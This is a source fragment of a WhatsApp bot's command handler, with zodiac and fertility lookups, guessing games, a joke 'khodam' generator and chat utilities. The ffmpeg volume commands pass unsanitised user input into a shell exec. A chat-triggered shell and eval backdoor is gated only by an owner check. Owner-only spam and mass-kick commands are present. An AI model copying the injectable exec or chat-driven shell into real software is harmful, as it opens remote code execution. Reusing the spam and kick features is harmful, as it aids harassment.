 if (!text) return m.reply(`Example : ${prefix + command} 12, 1, 2022, 28\n\nNote : ${prefix + command} hari pertama menstruasi, siklus`)
 let [tgl, bln, thn, siklus] = text.split`,`
 let anu = await primbon.masa_subur(tgl, bln, thn, siklus)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Hasil :* ${anu.message.result}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//=================================================//
case 'zodiak': case 'zodiac': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix+ command} 7 7 2005`)
 let zodiak = [
 ["capricorn", new Date(1970, 0, 1)],
 ["aquarius", new Date(1970, 0, 20)],
 ["pisces", new Date(1970, 1, 19)],
 ["aries", new Date(1970, 2, 21)],
 ["taurus", new Date(1970, 3, 21)],
 ["gemini", new Date(1970, 4, 21)],
 ["cancer", new Date(1970, 5, 22)],
 ["leo", new Date(1970, 6, 23)],
 ["virgo", new Date(1970, 7, 23)],
 ["libra", new Date(1970, 8, 23)],
 ["scorpio", new Date(1970, 9, 23)],
 ["sagittarius", new Date(1970, 10, 22)],
 ["capricorn", new Date(1970, 11, 22)]
 ].reverse()

 function getZodiac(month, day) {
 let d = new Date(1970, month - 1, day)
 return zodiak.find(([_,_d]) => d >= _d)[0]
 }
 let date = new Date(text)
 if (date == 'Invalid Date') return m.reply(date)
 let d = new Date()
 let [tahun, bulan, tanggal] = [d.getFullYear(), d.getMonth() + 1, d.getDate()]
 let birth = [date.getFullYear(), date.getMonth() + 1, date.getDate()]
 let zodiac = await getZodiac(birth[1], birth[2])
 let anu = await primbon.zodiak(zodiac)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Zodiak :* ${anu.message.zodiak}\n*Nomor :* ${anu.message.nomor_keberuntungan}\n*Aroma :* ${anu.message.aroma_keberuntungan}\n*Planet :* ${anu.message.planet_yang_mengitari}\n*Bunga :* ${anu.message.bunga_keberuntungan}\n*Warna :* ${anu.message.warna_keberuntungan}\n*Batu :* ${anu.message.batu_keberuntungan}\n*Elemen :* ${anu.message.elemen_keberuntungan}\n*Pasangan Zodiak :* ${anu.message.pasangan_zodiak}\n*Catatan :* ${anu.message.catatan}`, m)
}
break
//========================
case 'shio': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
 if (!text) return m.reply(`Example : ${prefix + command} tikus\n\nNote : For Detail https://primbon.com/shio.htm`)
 let anu = await primbon.shio(text)
 if (anu.status == false) return m.reply(anu.message)
 Al.sendMessage(from, `*Hasil :* ${anu.message}`, m)
}
break
//========================
case 'tebakgambar':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in tebakgambar) return m.reply('Masih ada game yang belum diselesaikan');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await Al.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar[from].jawaban}`);
delete tebakgambar[from];
}, gamewaktu * 1000)
}
break
//========================
case 'tebakanime':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (from in tebakanime) return m.reply('Masih ada game yang belum diselesaikan');
var { image, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebakanime.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK ANIME*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`
await Al.sendMessage(from, {image: {url: image}, caption: teks1}, {quoted: m})
tebakanime[from] = {
soal: image,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakanime[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${tebakanime[from].jawaban}`);
delete tebakanime[from];
}, gamewaktu * 1000)
}
break
//========================
case 'tebaklagu':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in tebaklagu) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, artis, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebaklagu.json')));
console.log('Jawaban : '+jawaban)
if (jawaban.toLowerCase() == 'audio tidak ditemukan, silahkan request ulang!') return m.reply('Maaf terjadi kesalahan!')
var teks1 = `*GAME TEBAK LAGU*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nArtist: ${artis}\nWaktu: ${gamewaktu} detik`
await Al.sendMessage(from, {audio: {url: soal}, mimetype: 'audio/mpeg', ptt: true}, {quoted: m}).then(res => {Al.sendteks(from, teks1, res)})
tebaklagu[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklagu[from]) m.reply(`Waktu habis\nJawabannya adalah: ${tebaklagu[from].jawaban}`);
delete tebaklagu[from];
}, gamewaktu * 1000)
}
break
//========================
case 'kuis':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in kuis) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/kuis.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME KUIS*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
kuis[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (kuis[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete kuis[from];
}, gamewaktu * 1000)
}
break
//========================
case 'tebakkalimat':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in tebakkalimat) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebakkalimat.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK KALIMAT*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkalimat[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkalimat[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkalimat[from];
}, gamewaktu * 1000)
}
break
//========================
case 'tebakkata':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`) 
if (from in tebakkata) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebakkata.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkata[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakkata[from];
}, gamewaktu * 1000)
}
break
//========================
case 'tebaklirik':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in tebaklirik) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebaklirik.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK LIRIK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebaklirik[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebaklirik[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebaklirik[from];
}, gamewaktu * 1000)
}
break
//========================
case 'cekkhodam': {
if (!text) return m.reply("Nama?")
  
	const khodam = pickRandom([
	  "Kaleng Cat Avian",
	  "Pipa Rucika",
	  "Botol Tupperware",
	  "Badut Mixue",
	  "Sabun GIV",
	  "Sandal Swallow",
	  "Jarjit",
	  "Ijat",
	  "Fizi",
	  "Mail",
	  "Ehsan",
	  "Upin",
	  "Ipin",
	  "sungut lele",
	  "Tok Dalang",
	  "Opah",
	  "Opet",
	  "Alul",
	  "Pak Vinsen",
	  "Maman Resing",
	  "Pak RT",
	  "Admin ETI",
	  "Bung Towel",
	  "Lumpia Basah",
	  "Martabak Manis",
	  "Baso Tahu",
	  "Tahu Gejrot",
	  "Dimsum",
	  "Seblak Ceker",
	  "Telor Gulung",
	  "Tahu Aci",
	  "Tempe Mendoan",
	  "Nasi Kucing",
	  "Kue Cubit",
	  "Tahu Sumedang",
	  "Nasi Uduk",
	  "Wedang Ronde",
	  "Kerupuk Udang",
	  "Cilok",
	  "Cilung",
	  "Kue Sus",
	  "Jasuke",
	  "Seblak Makaroni",
	  "Sate Padang",
	  "Sayur Asem",
	  "Kromboloni",
	  "Marmut Pink",
	  "Belalang Mullet",
	  "Kucing Oren",
	  "Lintah Terbang",
	  "Singa Paddle Pop",
	  "Macan Cisewu",
	  "Vario Mber",
	  "Beat Mber",
	  "Supra Geter",
	  "Oli Samping",
	  "Knalpot Racing",
	  "Jus Stroberi",
	  "Jus Alpukat",
	  "Alpukat Kocok",
	  "Es Kopyor",
	  "Es Jeruk",
	  "Cappucino Cincau",
	  "Jasjus Melon",
	  "Teajus Apel",
	  "Pop ice Mangga",
	  "Teajus Gulabatu",
	  "Air Selokan",
	  "Air Kobokan",
	  "TV Tabung",
	  "Keran Air",
	  "Tutup Panci",
	  "Kotak Amal",
	  "Tutup Termos",
	  "Tutup Botol",
	  "Kresek Item",
	  "Kepala Casan",
	  "Ban Serep",
	  "Kursi Lipat",
	  "Kursi Goyang",
	  "Kulit Pisang",
	  "Warung Madura",
	  "Gorong-gorong",
	])
  
	const response = `
  ╭━━━━°「 *Cekkodam* 」°
┃
┊• *Nama :* ${text}
┃• *Khodam :* ${khodam}
╰═┅═━––––––๑
	  `
  
	m.reply(response)
  }
break
//========================
case 'tebakkimia':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (from in tebakkimia) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebakkimia.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK KIMIA*\n\nSoal: ${soal}\nWaktu: ${gamewaktu} detik`)
tebakkimia[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakkimia[from]) m.reply(`Waktu berakhir :(\nNama unsur dari lambang ${soal}\n\nAdalah: ${monospace(jawaban)}`)
delete tebakkimia[from];
}, gamewaktu * 1000)
}
break
//========================
case 'tebakbendera':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in tebakbendera) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/tebakbendera.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME TEBAK BENDERA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
tebakbendera[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakbendera[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete tebakbendera[from];
}, gamewaktu * 1000)
}
break
//========================
case 'susunkata':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in susunkata) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/susunkata.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME SUSUN KATA*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
susunkata[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (susunkata[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete susunkata[from];
}, gamewaktu * 1000)
}
break
//========================
case 'asahotak':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in asahotak) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/asahotak.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME ASAH OTAK*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
asahotak[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (asahotak[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete asahotak[from];
}, gamewaktu * 1000)
}
break
//========================
case 'siapakahaku': case 'sa':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in siapakahaku) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/siapakahaku.json')));
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME SIAPAKAH AKU*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
siapakahaku[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (siapakahaku[from]) m.reply(`Waktu habis!\n\nJawaban dari soal:\n${monospace(soal)}\n\nAdalah: ${monospace(jawaban)}`);
delete siapakahaku[from];
}, gamewaktu * 1000)
}
break
//========================
case 'caklontong':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`) 
if (from in caklontong) return m.reply('Masih ada game yang belum diselesaikan');
var { soal, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./more/game/caklontong.json')));
console.log(`Jawaban : ${jawaban}\n${deskripsi}`)
await m.reply(`*GAME CAK LONTONG*\n\nSoal: ${soal}\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nWaktu: ${gamewaktu} detik`)
caklontong[from] = {
soal: soal,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (caklontong[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${jawaban}\n${deskripsi}`)
delete caklontong[from];
}, gamewaktu * 1000)
}
break
//========================
case 'math': case 'kuismath':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
if (!global.game) return m.reply(`Aktifkan Fitur Game Terlebih Dahulu Dengan Cara : ${prefix}game on`)  
if (from in kuismath) return m.reply('Masih ada game yang belum diselesaikan!');
let { genMath, modes } = require('./more/game/math')
if (!q) return m.reply( `┌─〔 Mode 〕\n├ ${Object.keys(modes).join('\n├ ')}\n└────\ncontoh:\n${prefix}math hard`)
if (!(Object.keys(modes)).includes(args[0])) return m.reply('Pilih mode yang bener GOBLOK!')
var { soal, jawaban, waktu, hadiah } = await genMath(q.toLowerCase()).catch((err) => m.reply('```Tolong pilih modenya yang benar contoh .math easy```'))
console.log('Jawaban : '+jawaban)
await m.reply(`*GAME KUIS MATH*\n\nSoal: Berapa hasil dari ${soal.toLowerCase()}\nWaktu: ${waktu / 1000} detik`)
kuismath[from] = {
soal: soal,
jawaban: jawaban,
hadiah: randomNomor(2000, hadiah),
waktu: setTimeout(function () {
if (kuismath[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${jawaban}`)
delete kuismath[from];
}, waktu)
}
break
//========================
case 'family100': case 'f100':
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
var { soal, jawaban } = pickRandom(JSON.parse(fs.readFileSync('./more/game/family100.json')));
console.log('Jawaban : '+jawaban)
let famil = []
for (let i of jawaban){
let fefsh = i.split('/') ? i.split('/')[0] : i
let iuhbs = fefsh.startsWith(' ') ? fefsh.replace(' ','') : fefsh
let axsfh = iuhbs.endsWith(' ') ? iuhbs.replace(iuhbs.slice(-1), '') : iuhbs
famil.push(axsfh.toLowerCase())
}
await m.reply(`*GAME FAMILY 100*\n\nSoal: ${soal}\nTotal Jawaban: ${jawaban.length}\n\nWaktu: ${gamewaktu} detik`)
family100[from] = {
soal: soal,
jawaban: famil,
hadiah: randomNomor(10, 20),
waktu: setTimeout(async function () {
if (from in family100) {
let teks = `*WAKTU HABIS!*\nJawaban yang belum terjawab :\n\n`
let jwb = family100[from].jawaban
for (let i of jwb){teks += `\n${i}`}
m.reply(teks)
delete family100[from];
};
}, gamewaktu * 1000)
}

break
//========================
case 'enc': 
case 'encrypt': 
case 'obfuscate': {
if (!q) return m.reply(`Contoh ${prefix+command} const time = require('money')`)
let meg = await obfus(q)
m.reply(`${meg.result}`)
}
break
//========================
case 'balaschat': 
case 'balas':
case 'replychat':
case 'reply': {
if (!isRegistered) return terdaftar()
if (isBan) return terbanned()
roof = Object.values(this.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return m.reply("Tidak Ada Sesi Chatan")
find = Object.values(this.menfes).find(menpes => menpes.state == '_WAITING_')
let room = Object.values(this.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === '_WAITING_')
let other = [room.a, room.b].find(user => user !== m.sender)
find.b = m.sender
find.state = '_CHATING_'
this.menfes[find.id] = {...find}
await Al.sendMessage(other, {text: `@${m.sender.split("@")[0]} Telah Menerima Chat Mu`, mentions: [m.sender]})
Al.sendMessage(m.chat, {text: `Chat Telah Diterima Ke User *${global.wm}*`})
}
break
//========================
case 'clearall': {
if (!isCreator) return m.reply('Special For Owner Features!')
Al.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat)
}
break
//========================
case 'pinchat': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (m.isGroup) return m.reply('Fitur Khusus Private!')
Al.chatModify({ pin: true }, m.chat)
}
break
//========================
case 'unpinchat': {
if (!isCreator) return m.reply('Special For Owner Features!')
if (m.isGroup) return m.reply('Fitur Khusus Private!')
Al.chatModify({ pin: false }, m.chat)
}
break
//========================
case 'spam':
if (!isCreator) return m.reply('Special For Owner Features!')
if (!text) return m.reply(`Use ${prefix +command} text|amount`)
aibotzzz = text.split("|")
if (!aibotzzz) return m.reply(`Use ${prefix+ command} Text|Amount`)
if (Number(aibotzzz[1]) >= 50) return m.reply('Max 50!')
if (isNaN(aibotzzz[1])) return m.reply(`Must be a number`)
for (let i = 0; i < aibotzzz[1]; i++){
Al.sendMessage(from, {text: aibotzzz[0]})
}
break
//========================
case 'q': case 'quoted': {
if (!quoted) return m.reply('Reply the Message!')
let jircok = await Al.serializeM(await m.getQuotedObj())
if (!jircok.quoted) return m.reply(`Reply Pesan Seseorang Bukan ${wm}`)
await Al.quoted.copyNForward(m.chat, true)
}
break
//========================
case 'kickall': {
 if (!m.isGroup) return m.reply('Fitur Khusus Group!')
 if (!isAdmins && !isCreator) return m.reply('Special For Owner Features & Admin!')
 if (!isBotAdmins) return m.reply('Saya Bukan Admin grup!')
  const kickall = (args[0] === 'numBut')
  ? text.replace(`${args[0]} `, '').split('|')
  : (Number(args[0]))
    ? groupMetadata.participants
      .filter(item => item.id.startsWith(args[0].replace('+', '')) && item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id)
    : groupMetadata.participants
      .filter(item => item.id !== botNumber && item.id !== `${owner}@s.whatsapp.net`)
      .map(item => item.id);
 if (global.welcome === true) {
 welcome = false;
  }
 for (let remove of kickall) {
 await Al.groupParticipantsUpdate(m.chat, [(args[0] === "numBut") ? `${remove}@s.whatsapp.net` : remove], "remove");
 await sleep(100);
 }
 m.reply(`Success`);
}
break
//========================
case 'volaudio': {
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} 10`)
media = await Al.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error Kak')
jadie = fs.readFileSync(rname)
Al.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
//========================
case 'volvideo': {
if (!args.join(" ")) return m.reply(`Example : ${prefix + command} 10`)
media = await Al.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return m.reply('Error Kak')
jadie = fs.readFileSync(rname)
Al.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: m})
fs.unlinkSync(rname)
})
}
break
//========================
default:
if ((type === 'groupInviteMessage' || budy.includes('https://chat') || budy.includes('Buka tautan ini|Undangan untuk bergabung ke grup WhatsApp saya')) && !m.isBaileys && !m.isGroup && !isOwner) {
let teks = ('Lu Ngapain, Bayar Dulu Bang Wkwk')      
m.reply(teks)
}

if (budy.startsWith('$')) {
if (!isCreator) return m.reply('Malas peler')
exec(budy.slice(2), (err, stdout) => {
if (err) return m.reply(`${err}`)
if (stdout) return m.reply(stdout)
})
}

if (budy.startsWith('>')) {
if (!isCreator) return m.reply('Malas peler')
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await m.reply(evaled)
}
catch (err) {
await m.reply(util.format(err))
}
}
}
}
catch (err) {
console.log(util.format(err))
let e = String(err)
Al.sendMessage("94742274855@s.whatsapp.net", { text: "*අයිතිකරු සඳහා*\nදෝෂයක් තිබේ.\n\n*ERROR/BUG*\n" + util.format(e), 
contextInfo:{
forwardingScore: 1, 
isForwarded: false
}})
    }
}